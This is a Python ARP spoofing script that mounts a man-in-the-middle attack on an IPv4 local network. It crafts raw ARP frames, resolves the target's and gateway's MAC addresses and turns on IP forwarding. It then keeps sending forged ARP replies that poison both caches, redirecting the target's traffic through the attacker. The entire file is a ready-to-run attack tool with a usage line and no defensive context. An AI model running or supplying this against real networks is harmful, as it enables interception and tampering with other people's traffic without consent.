# ARPspoof (ARP Man-In-The-Middle in IPv4)     by 0bfxgh0st*
import sys, os, netifaces, socket, binascii, struct, time

help = "ARPspoof (ARP Man-In-The-Middle in IPv4)     by 0bfxgh0st*", "Usage: sudo python3 " + sys.argv[0] + " -i <interface> -t <target ip> -g <gateway ip>"

def recvData():

  s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
  while True:
    data, addr = s.recvfrom(65536)
    eth_header = struct.unpack("!6s6sH", data[:14])
    dest_mac = "".join("{:02x}".format(x) for x in eth_header[1])
    return dest_mac

def getMAC():

  # Ether layer
  pro = 0x806 # protocol type (ARP)
  sendermac = binascii.unhexlify(netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr'].replace(':', ''))
  broadcast = binascii.unhexlify('ff:ff:ff:ff:ff:ff'.replace(':', ''))
  targetmac = binascii.unhexlify('00:00:00:00:00:00'.replace(':', ''))
  ether = struct.pack("!6s6sH",broadcast,sendermac,pro)

  # ARP layer   see http://www.tcpipguide.com/free/t_ARPMessageFormat.htm
  hrd = 1 # hardware type
  pro = 0x800 # protocol type
  hln = 6 # mac addr len
  pln = 4 # ip addr len
  op = 1 # opcode 1=request/2=reply
  sha = sendermac # sender mac addr
  spa = socket.inet_aton(machineip) # sender ip addr
  tha = targetmac # target mac addr
  tpa = socket.inet_aton(gatewayip) # target ip addr

  arp = struct.pack("!HHBBH6s4s6s4s",hrd,pro,hln,pln,op,sha,spa,tha,tpa)
  packet = ether + arp
  
  s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
  s.bind((interface, 0))
  s.send(packet)
  router_mac=recvData()
  
  tpa = socket.inet_aton(targetip) # target ip addr

  arp = struct.pack("!HHBBH6s4s6s4s",hrd,pro,hln,pln,op,sha,spa,tha,tpa)
  packet = ether + arp
  
  s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
  s.bind((interface, 0))
  s.send(packet)
  tar_mac=recvData()
  
  return packet,router_mac,tar_mac

def spoofClient():

# Ether layer
  pro = 0x806 # protocol type (ARP)
  sendermac = binascii.unhexlify(netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr'].replace(':', ''))
  targetmac = binascii.unhexlify(tar_mac)
  ether = struct.pack("!6s6sH",targetmac,sendermac,pro)
  
  # ARP layer   see http://www.tcpipguide.com/free/t_ARPMessageFormat.htm
  hrd = 1 # hardware type
  pro = 0x800 # protocol type
  hln = 6 # mac addr len
  pln = 4 # ip addr len
  op = 1 # opcode 1=request/2=reply
  sha = sendermac # sender mac addr
  spa = socket.inet_aton(gatewayip) # sender ip addr
  tha = sendermac # target mac addr
  tpa = socket.inet_aton(targetip) # target ip addr

  arp = struct.pack("!HHBBH6s4s6s4s",hrd,pro,hln,pln,op,sha,spa,tha,tpa)
  packet = ether + arp
  
  return packet

def spoofGateway():

# Ether layer
  pro = 0x806 # protocol type (ARP)
  sendermac = binascii.unhexlify(netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr'].replace(':', ''))
  targetmac = binascii.unhexlify(router_mac)
  ether = struct.pack("!6s6sH",targetmac,sendermac,pro)

  # ARP layer   see http://www.tcpipguide.com/free/t_ARPMessageFormat.htm
  hrd = 1 # hardware type
  pro = 0x800 # protocol type
  hln = 6 # mac addr len
  pln = 4 # ip addr len
  op = 1 # opcode 1=request/2=reply
  sha = sendermac # sender mac addr
  spa = socket.inet_aton(targetip) # sender ip addr
  tha = targetmac # target mac addr
  tpa = socket.inet_aton(gatewayip) # target ip addr

  arp = struct.pack("!HHBBH6s4s6s4s",hrd,pro,hln,pln,op,sha,spa,tha,tpa)
  packet = ether + arp
  
  return packet

if (len(sys.argv) < 7):
  print(help[0])
  print(help[1])
  exit(1)

arguments_list = []
for arg in sys.argv:
  arguments_list.append(arg)
for argument in arguments_list:  
  if argument == '-i':
   n = arguments_list.index(argument)+1
   interface = arguments_list[n]
  if argument == '-t':
    n = arguments_list.index(argument)+1
    targetip = arguments_list[n]
  if argument == '-g':
    n = arguments_list.index(argument)+1
    gatewayip = arguments_list[n]

try:
  print(help[0])  
  machineip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
  router_mac=getMAC()[1]
  tar_mac=getMAC()[2]  
except ValueError:
  print("\nNot a valid interface")
  exit(1)
except PermissionError:
  print(help[1])
  print("\n[!] Run as administrator")
  exit(1)  
except:
  print(help[1])
  exit(1)

def main():
  
  print("[+] Retrieving MAC Addresses from ARP packets")
  if sys.platform == 'linux':
    print("[+] Enabling ip forward")
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
  s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
  s.bind((interface, 0))
  ARPClient=spoofClient()
  ARPGateway=spoofGateway()
  print("[*] Spoofing")
  while True:  
    try:
      s.send(ARPClient)
      time.sleep(1)
      s.send(ARPGateway)
      time.sleep(1)
    except:
      s.close()
      if sys.platform == 'linux':
        print("[-] Disabling ip forward")
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
      exit(1)

main()
